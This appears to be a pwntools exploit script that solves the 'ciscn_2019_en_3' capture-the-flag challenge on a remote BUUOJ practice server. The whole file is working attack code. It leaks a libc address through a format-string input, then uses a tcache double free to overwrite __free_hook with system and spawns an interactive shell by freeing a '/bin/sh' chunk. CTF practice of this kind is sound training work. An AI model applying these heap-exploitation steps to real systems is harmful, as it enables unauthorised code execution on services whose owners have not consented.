from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_2019_en_3')
p = remote('node4.buuoj.cn', 28109)
libc = ELF('libc-2.27.buu.so')

def alloc(size, content):
    p.sendlineafter(b'choice:', b'1\n')
    p.sendlineafter(b'size of story: ', str(size).encode())
    p.sendlineafter(b'story: ', content)

def delete(index):
    p.sendlineafter(b'choice:', b'4\n')
    p.sendlineafter(b'index:', str(index).encode())

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + '\n' + s)

p.sendlineafter(b'name?\n', b'%p::%p::%p::%p::%p::%p')
for i in range(4):
    p.recvuntil(b'::')

io_file_jumps = int(p.recv(14), 16)
libc_base = io_file_jumps - libc.sym['_IO_file_jumps']
success('libc_base -> {}'.format(hex(libc_base)))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

p.sendlineafter(b'ID.\n', b'Yeuoly')

#double free to overwrite free_hook
alloc(0x20, b'a')
alloc(0x20, b'/bin/sh')
delete(0)
delete(0)
alloc(0x20, p64(free_hook))
alloc(0x20, b'a')
alloc(0x20, p64(system))

delete(1)

p.interactive()